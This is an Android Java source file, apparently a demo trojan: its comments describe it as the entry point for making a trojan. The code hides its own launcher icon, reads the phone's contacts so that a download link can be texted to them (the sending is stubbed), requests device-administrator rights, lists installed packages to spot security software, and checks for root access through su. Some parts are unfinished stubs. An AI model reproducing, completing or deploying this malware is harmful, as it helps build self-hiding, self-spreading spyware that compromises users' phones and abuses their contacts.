package mixi.com.woodenhorsedemo;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import static java.lang.Runtime.getRuntime;

/**
 咪嘻木马制作入口
 */
public class MainActivity extends AppCompatActivity {

    static {
        System.loadLibrary("check");
    }

    private final int SECURITY = 0x001;
    private Handler mSecurityNotify = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
            }
        }
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // TextView tv = (TextView) findViewById(R.id.sample_text);
        // tv.setText(stringFromJNI());
        //  readContacts();
        // becomeDeviceManage();
        stringFromJNI();
    }

    public native String stringFromJNI();

    /**
     * 隐藏自己
     */
    public void hiddenSelfPackage() {
        /**
         *包名
         * 状态：COMPONENT_ENABLED_STATE_DISABLED 不可用状态
         * 可用状态：COMPONENT_ENBLED_STATE_ENBLE
         * 默认状态：COMPONENT_ENBLED_STATED_DEAFULT
         * 是否杀死自己0,表示杀死
         */
        getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    /**
     读取联系人并进行发送消息，然后发送给联系人的链接进行下载
     */
    public void readContacts() {
        ContentResolver contentResolver = getContentResolver();
        Cursor query = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (!query.moveToNext()) {
            query.close();
            return;

        }
        String display_name = query.getString(query.getColumnIndex("display_name"));
        String _id = query.getString(query.getColumnIndex("_id"));
        Cursor contactCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = " + _id, null, null);
        for (contactCursor.moveToFirst(); !contactCursor.isAfterLast(); contactCursor.moveToNext()) {
            String str2 = contactCursor.getString(contactCursor.getColumnIndex("data1"));
            System.out.println(display_name + "" + str2);
            //sendTextMessage
        }
    }

    /**
     * 成为牛逼的设备管理器
     */
    public void becomeDeviceManage() {
        //第一步 注册一个广播，用于监听权限的变化
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        ComponentName componentName = new ComponentName(this, MiXiDeviceAdminReceiver.class);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "咪嘻咪嘻广播");
        startActivityForResult(intent, 01010);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 01010) {
            if (RESULT_OK == resultCode) {

            }
        }
    }

    /**
     * 制作检的检测通知
     */
    public void notifyMessage() {
        //三星，360，小米，华为，魅族，默认
        //TODO 进行通知


    }

    /**
     * 扫描当前操作系统和品牌，以及安全软件
     */
    public List<String> scanPackageL() {
        //进行包扫描
        List<String> packageNames = new ArrayList<>();
        ProcessBuilder builder = new ProcessBuilder("/system/bin/pm", "list package");
        try {
            Process start = builder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(start.getInputStream(), "utf-8"));
            String packageName = reader.readLine();
            packageNames.add(packageName);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return packageNames;
    }

    /**
     * 使用root功能
     */
    public boolean rootUtil() {
        //TODO  判断是否有root功能
        return false;
    }

    /**
     * 判断是否授权root
     */
    public boolean hasRootPemissionGrant() {
        //判断是否被root授权
        try {
            Process process = null;
            process = getRuntime().exec("su");
            process.getOutputStream().write("exit\n".getBytes());
            process.getOutputStream().flush();
            int i = process.waitFor();
            if (0 == i) {
                process = getRuntime().exec("su");
                return true;
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }



}
